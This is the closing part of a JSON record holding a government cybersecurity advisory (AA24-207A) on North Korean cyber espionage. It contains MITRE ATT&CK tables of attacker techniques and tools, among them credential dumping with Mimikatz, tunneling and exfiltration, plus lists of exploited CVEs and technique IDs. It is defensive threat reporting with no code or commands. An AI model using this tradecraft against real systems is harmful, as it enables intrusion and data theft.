Tools (RATs)  \nTechnique Title  ID Use \nOS Credential Dumping  T1003  The actors attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text \npassword, from the operating system and software.  \nExfiltration Over \nAlternative Protocol  T1048  The actors steal data by exfiltrating it over a different protocol than that \nof the existing command and control channel.  \nProxy  T1090  The actors use a connection proxy to direct network traffic between systems or act as intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.  \nArchive Collected Data  T1560  The actors compress and/or encrypt data that is collected prior to \nexfiltration.  \nProtocol Tunneling  T1572  The actors tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.  \nDevelop Capabilities: \nMalware  T1587.\n001 The actors develop malware and malware components that can be used \nduring targeting.  \n\n \nPage 28 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Technique Title  ID Use \nDevelop Capabilit ies: \nExploits  T1587.\n004 The actors develop exploits that can be used during targeting.  \nTable 5 . Software used for Resourc e Development, Tooling, and RATs  \nSoftware Title  ID Use \nMimikatz  S0002  The actors use a credential dumper capable of obtaining plaintext \nWindows account logins and passwords, along with many other features that make it useful for testing the security of networks.  \nAdFind  S0552  The actors use a free command-line query tool that can be used  for \ngathering information from the Active Directory.  \nTable 6 . Initial Access \nTechnique Title  ID Use \nExploit Public -Facing \nApplication T1190  The actors attempt to exploit a weakness in an Internet -facing host or \nsystem to initially access a network.  \nTable 7 . Exec ution  \nTechnique Title  ID Use \nCommand and Scripting Interpreter  T1059\n The actors abuse command and script interpreters to execute commands, scripts, or binaries.  \nTable 8 . Defense Evasion  \nTechnique Title  ID Use \nObfuscated Files or Information  T1027\n The actors attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its content on the system or in tr ansit.  \n\n \nPage 29 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Table 9 . Credential Access \nTechnique Title  ID Use \nOS Credential Dumping  T1003  The actors attempt to dump credentials to obtain account login and \ncredential material, normally in the form of a hash or a clear text password, from the operating system and software.  \nTable 10. Discovery and Lateral Movement  \nTechnique Title  ID Use \nRemote Services  T1021  The actors use valid accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC.  \nRemote Se rvices: \nSMB/Windows Admin \nShares T1021.\n002 The actors use valid accounts to interact with a remote network share \nusing Server Message Block (SMB).  \nFile and Directory Discovery T1083\n The actors  enumerate files and directories or may search in specific \nlocations of a host or network share for certain information within a file system.  \nAccount Discovery  T1087  The actors attempt to get a listing of valid accounts, usernames, or \nemail addresses on a system or within a compromised environment.  \nTable 11. Command and Control \nTechnique Title  ID Use \nApplication Layer Protoc ol  T1071\n The actors establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, telnet, DNP3, and Modbus.  \nProxy  T1090  The actors use a connection proxy to direct network traffic between \nsystems or act as an intermediary for network communications.  \nTable 12. Collection and Exfiltration  \nTechnique Title  ID Use \nData from Network Shared Drive  T1039\n The actors search network shares on computers they have compromised to find files of interest.  \n\n \nPage 30 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Technique Title  ID Use \nExfiltration Over \nAlternative Protocol  T1048  The acto rs steal data by exfiltrating it over a different protocol than \nthat of the existing command and control server.  \nArchive Collected Data  T1560  The ac tors compress and/or encrypt data that is collected prior to \nexfiltration.  \nExfiltration Over Web \nService T1567  The actors use an existing, legitimate  external Web service to exfiltrate \ndata rather than their primary command and control channel.  \n \n\n",
  "cves": [
    "CVE-2023-3079",
    "CVE-2023-21932",
    "CVE-2022-22965",
    "CVE-2021-44142",
    "CVE-2021-43226",
    "CVE-2023-28771",
    "CVE-2023-34362",
    "CVE-2021-20028",
    "CVE-2023-3519",
    "CVE-2022-24665",
    "CVE-2023-35078",
    "CVE-2021-3018",
    "CVE-2023-27997",
    "CVE-2022-25064",
    "CVE-2023-46604",
    "CVE-2022-47966",
    "CVE-2023-32315",
    "CVE-2019-0708",
    "CVE-2022-22947",
    "CVE-2017-4946",
    "CVE-2022-21882",
    "CVE-2021-44228",
    "CVE-2023-0669",
    "CVE-2022-24785",
    "CVE-2023-33246",
    "CVE-2023-42793",
    "CVE-2023-25690",
    "CVE-2023-2868",
    "CVE-2022-22005",
    "CVE-2019-15637",
    "CVE-2022-30190",
    "CVE-2021-41773",
    "CVE-2021-40684",
    "CVE-2019-7609",
    "CVE-2022-41352",
    "CVE-2023-32784",
    "CVE-2022-24990",
    "CVE-2021-20038"
  ],
  "techniques": [
    "T1090",
    "T1190",
    "T1039",
    "T1021",
    "T1021.002",
    "T1027",
    "T1587.004",
    "T1591",
    "T1567",
    "T1592",
    "T1071",
    "T1572",
    "T1083",
    "T1587.001",
    "T1059",
    "T1048",
    "T1587",
    "T1560",
    "T1003",
    "T1040",
    "T1596",
    "T1595",
    "T1087"
  ],
  "advisory": "cybersecurity-alerts",
  "title": "joint-csa-north-korea-cyber-espionage-advance-military-nuclear-programs",
  "source": "nsa",
  "id": "15fd6d7f5b80d7f55ced73c338021a55e26b92981635e3a344bd743fd66dc98f"
}